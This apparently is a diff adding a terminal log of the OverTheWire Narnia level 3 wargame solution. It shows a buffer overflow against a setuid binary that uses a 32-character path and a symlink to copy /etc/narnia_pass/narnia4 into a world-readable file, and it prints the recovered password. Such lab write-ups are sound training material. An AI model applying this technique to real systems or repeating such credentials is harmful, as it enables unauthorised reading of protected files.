@@ -1,0 +1,14 @@
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ cd
+narnia3@narnia:~$ python -c 'print(len("/tmp/" + "a"*27))'
+32
+narnia3@narnia:~$ mkdir -p $(python -c 'print ("/tmp/" + "a"*27 + "/tmp")')
+narnia3@narnia:~$ cd $(python -c 'print ("/tmp/" + "a"*27 + "/tmp")')
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ ln -s /etc/narnia_pass/narnia4 abc
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ touch /tmp/abc
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ chmod 777 /tmp/abc
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ /narnia/narnia3 `pwd`/abc #test our solution
+copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/abc to a safer place... (/tmp/abc)
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ cat /tmp/abc
+thaenohtai
+�(.��P��4������ narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp$ 
+
